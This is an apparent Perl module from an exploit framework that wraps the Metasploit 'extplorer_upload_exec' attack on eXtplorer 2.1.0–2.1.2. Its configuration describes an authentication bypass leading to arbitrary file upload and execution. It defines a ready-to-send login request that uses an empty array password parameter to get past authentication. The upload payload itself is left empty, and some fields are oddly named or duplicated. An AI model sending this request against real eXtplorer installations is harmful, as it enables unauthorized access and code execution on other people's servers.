package MSFExploits::Exploits::EXTPLORER::MSF::ExtplorerUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::EXTPLORER);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ExtplorerUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION"                 => "

        This module exploits an authentication bypass vulnerability in eXtplorer

        versions 2.1.0 to 2.1.2 and 2.1.0RC5 when run as a standalone application.

        This application has an upload feature that allows an authenticated user

        with administrator roles to upload arbitrary files to any writable

        directory in the web root. This module uses an authentication bypass

        vulnerability to upload and execute a file.

      ",
  "METHOD"                      => "POST",
  "MSF_MODULE"                  => "extplorer_upload_exec",
  "OSVDB"                       => 88751,
  "PATH"                        => "__BASE__index.php?",
  "PATHS"                       => [
                                     "__BASE__index.php",
                                     "__BASE__index.php",
                                     "com_extplorer_2.1.0/",
                                   ],
  "PAYLOAD"                     => "",
  "REFERENCES"                  => [
                                     "http://itsecuritysolutions.org/2012-12-31-eXtplorer-v2.1-authentication-bypass-vulnerability",
                                     "http://extplorer.net/issues/105",
                                   ],
  "THE USERTITLE FOR EXTPLORER" => "admin",
  VARIABLES => {
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'COOKIE' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The path to the web application",
  VALUE => "/com_extplorer_2.1.0/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'index.php',
      PAYLOAD      => 'option=com_extplorer&action=login&type=extplorer&username=__USERNAME__&password[]=',
      TEXT   => 'Sending Exploit #1 Request : [POST] /index.php',
      HEADERS      => {
        'Cookie' => 'eXtplorer=vnavyewtqvhhanhfnitdqqjpur;',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
